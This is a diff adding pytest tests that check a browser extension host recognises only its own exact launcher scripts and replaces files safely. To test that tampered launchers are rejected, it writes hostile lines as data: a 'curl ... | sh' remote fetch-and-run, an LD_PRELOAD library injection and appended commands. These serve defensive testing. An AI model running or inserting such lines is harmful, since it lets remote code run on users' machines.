@@ -1059,8 +1059,61 @@ def test_install_replaces_only_its_own_launcher_and_never_writes_through_a_link(
     assert json.loads(other.read_text()) == {'path': str(launcher)} and not launcher.exists()
     manifest.unlink()
     extension_host.install('helium')
-    assert extension_host._owned_launcher(launcher) and not launcher.is_symlink()
+    assert extension_host._owned_launcher(launcher, 'helium') and not launcher.is_symlink()
     extension_host.install('helium')  # Its own launcher is replaced.
+
+
+# The one launcher format that v0.21.0 to v0.26.0 wrote, copied from those releases (not generated).
+def released_launcher(browser, python, socket_path):
+    import shlex
+    if os.name == 'nt':
+        extra = f' --socket "{socket_path}"' if socket_path else ''
+        return f'@echo off\r\n"{python}" -I -m akdbx.extension_host --browser {browser}{extra} %*\r\n'
+    extra = ' --socket ' + shlex.quote(socket_path) if socket_path else ''
+    return f'#!/bin/sh\nexec {shlex.quote(python)} -I -m akdbx.extension_host --browser {browser}{extra} "$@"\n'
+
+
+def test_only_an_exact_akdbx_launcher_is_owned(tmp_path):
+    # N5: the paths are read back from the file and the launcher is generated again; only an identical file counts.
+    launcher = tmp_path / 'chrome.sh'
+    folder = tmp_path / "py dir 'quoted'"
+    python, socket_path = str(folder / 'python3'), str(tmp_path / 'run dir' / 'akdbx.sock')
+    for browser in ('helium', 'chrome', 'edge'):
+        for sock in (None, socket_path):
+            launcher.write_bytes(released_launcher(browser, python, sock).encode('utf-8'))
+            assert extension_host._owned_launcher(launcher, browser), (browser, sock)
+            assert not extension_host._owned_launcher(launcher, 'helium' if browser != 'helium' else 'edge')
+    if os.name == 'nt':
+        extra = [released_launcher('chrome', python, None).replace('@echo off\r\n', '@echo off\r\nset X=1\r\n'),
+                 released_launcher('chrome', python, None) + 'calc.exe\r\n']
+    else:
+        ours = released_launcher('chrome', python, socket_path)
+        extra = [ours.replace('exec ', 'exec env LD_PRELOAD=/tmp/x.so '),
+                 ours.replace('#!/bin/sh\n', '#!/bin/sh\ncurl https://example.invalid | sh\n'),
+                 ours + 'touch /tmp/owned\n',
+                 ours.replace(' "$@"', ' --extra "$@"'),
+                 ours.replace('-I -m', '-m')]
+    for text in extra:
+        launcher.write_bytes(text.encode('utf-8'))
+        assert not extension_host._owned_launcher(launcher, 'chrome'), text
+
+
+def test_a_replaced_file_uses_its_own_temporary_file(tmp_path, monkeypatch):
+    # N6: a file at the old fixed temporary name is neither removed nor used, also when the rename fails.
+    target = tmp_path / 'chrome.sh'
+    other = tmp_path / '.chrome.sh.tmp'
+    other.write_text("another program's file")
+    extension_host._replace_file(target, 'new launcher', 0o700)
+    assert target.read_text() == 'new launcher' and other.read_text() == "another program's file"
+    assert sorted(path.name for path in tmp_path.iterdir()) == ['.chrome.sh.tmp', 'chrome.sh']
+
+    def fail(source, destination):
+        raise OSError('rename refused')
+    monkeypatch.setattr(extension_host.os, 'replace', fail)
+    with pytest.raises(OSError, match='rename refused'):
+        extension_host._replace_file(target, 'newer launcher', 0o700)
+    assert target.read_text() == 'new launcher' and other.read_text() == "another program's file"
+    assert sorted(path.name for path in tmp_path.iterdir()) == ['.chrome.sh.tmp', 'chrome.sh']
 
 
 def test_abandoned_pins_expire_instead_of_blocking_new_pins():
